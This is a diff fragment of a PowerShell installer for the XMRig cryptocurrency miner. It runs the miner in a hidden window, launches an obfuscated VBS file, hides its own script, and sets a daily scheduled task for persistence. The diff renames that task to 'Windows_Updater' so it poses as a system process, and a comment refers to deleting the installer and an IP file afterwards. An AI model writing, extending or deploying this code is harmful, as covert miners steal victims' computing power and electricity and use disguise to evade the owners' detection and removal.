@@ -113,14 +113,14 @@ Start-Process -windowstyle hidden -ArgumentList "$initial_dir\xmrig-6.22.2\w.bat
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 cd "$initial_dir\xmrig-6.22.2"
 Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
-Start-Process -FilePath ".\xmrig.exe" -ArgumentList "--config=config.json" -NoNewWindow -Wait
+#Start-Process -FilePath ".\xmrig.exe" -ArgumentList "--config=config.json" -NoNewWindow -Wait
 
 Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 
 & "./TMqhONoBljEv.vbs"
 
 Set-ItemProperty -Name Attributes -Path "$initial_dir\AEQKCPrkuifY.ps1" -Value "Hidden"
 
-$TaskName = "EDPNOTIFY"
+$TaskName = "Windows_Updater"
 $TaskPath = "C:\Windows\System32\Tasks\$TaskName"
 $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$path\AEQKCPrkuifY.ps1"
 $Trigger = New-ScheduledTaskTrigger -Daily -At 07:00AM
@@ -129,8 +129,6 @@ $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoi
 $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -TaskPath $TaskPath -Principal $Principal -Settings $Settings
 
 Start-Process -FilePath "$path\AEQKCPrkuifY.ps1" -windowstyle hidden
-
-# Pause for 200 seconds
 Start-Sleep -Seconds 200
 
 # Delete Installer Script and IP File
